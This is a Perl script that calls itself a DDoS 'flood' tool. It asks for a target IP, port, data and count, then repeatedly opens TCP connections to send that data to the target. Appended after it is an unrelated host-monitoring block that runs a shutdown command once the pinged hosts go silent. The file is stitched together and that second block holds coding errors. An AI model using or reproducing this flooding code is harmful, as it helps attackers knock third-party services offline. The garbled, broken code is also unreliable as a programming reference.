#!/usr/bin/perl
use IO::Socket;
print q{
__________  ____  _____
|____  ____|/ ___||  _  |
    |  |   / /    |   __|
    |  |  (  \___ |  |
    |__|   \_____||__|
 _________  __                     _
\_   _____/|  |   ____   ____   __| |
 |    __)  |  |  /  _ \ /  _ \ / __ |
 |   |     |  |_(  <_> |  <_> ) /_/ |
 \___|     |____/\____/ \____/\_____|

Coded By ReloadedUser328                   STOP-Flood   =  [ Ctrl + C ]                             

[---------------------------[Flood-Data]--------------------------------]

};

print "IP : ";
$serv = <stdin>;
chop ($serv);
syswrite STDOUT, "\n";
syswrite STDOUT, "[Config IP] : Finish\n";
syswrite STDOUT, "\n";
print "Port : ";
$port = <stdin>;
chop ($port);
syswrite STDOUT, "\n";
syswrite STDOUT, "[Config Port] : Finish\n";
syswrite STDOUT, "\n";
print "Data-IMS : ";
$data = <stdin>;
chop($data);
syswrite STDOUT, "\n";
syswrite STDOUT, "[Config Data] : Finish\n";
syswrite STDOUT, "\n";
print "Times To Flood : ";
$times = <stdin>;
chop ($times);
syswrite STDOUT, "\n";
syswrite STDOUT, "[Config Time] : Finish\n";
syswrite STDOUT, "\n";
syswrite STDOUT, "\n";
syswrite STDOUT, "[------------------------------[DDos-Data]------------------------------]\n";
syswrite STDOUT, "\n";
syswrite STDOUT, "[DDos-Data] : Socket-Shooting  [IP]   : [$serv]\n";
syswrite STDOUT, "[DDos-Data] : Socket-Shooting  [Port] : [$port]\n";
syswrite STDOUT, "[DDos-Data] : Socket-Shooting  [Time] : [$times]\n";
syswrite STDOUT, "\n";
syswrite STDOUT, "[-----------------------------------------------------------------------]\n";
syswrite STDOUT, "\n";
syswrite STDOUT, "\n";
syswrite STDOUT, "[------------------------------[Flood-Log]------------------------------]\n";
syswrite STDOUT, "\n";
syswrite STDOUT, "[DDos-Data] : + Socket-Shooting To $serv : $port [Time : $times]\n";
syswrite STDOUT, "\n";

for ($i=0; $i<$times; $i++)
{
$flood = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "$port") || print "[INFO] Hosting : $serv Is Unresponsive\n";
print $flood $data;

}

use Net::Ping;
use Getopt::Std;
  
 my $command = "Shutdown -h now";
 my $sleep_time = 300;
 my $timeout = 10;
 my $hosts = ();
 
 my %options = ();
 getopt "cst", \%options;
 $command = @options{c} if defined @options{c};
 $sleep_time = @options{s} if defined @options{s};
 $timeout = @options{t} if defined @options{t};
 @hosts = @ARGV;
  
if (scalar @hosts < 1) {
     print "Usage : $0 [Options] List Of Ip\n";
     print "\t-c\tCommand To Run\n";
     print "\t-s\tSleep Time Between Pinging (In Seconds)\n";
     print "\t-t\tPing Timeout (In Seconds)\n";
     exit -1;
 }
  
  $ping = Net::Ping->new("tcp", $Timeout);
  
  my $again;
 do {
     $again = 0;
     # Wait some time before checking 
     sleep $sleep_time;
     # Ping machines 
     foreach (@hosts) {
         my $present = $ping->ping($_);
         $again |= $present;
     }
 } while ($again);
  
 $ping->close();
  
 # Info 
 print "$0: Disconnection-Hosts: @hosts\n";
 print "$0: Running-Command '$command'\n";
  
 # Run command 
 System $command;
 
print "[DDos-Data] : End Of Flood\n";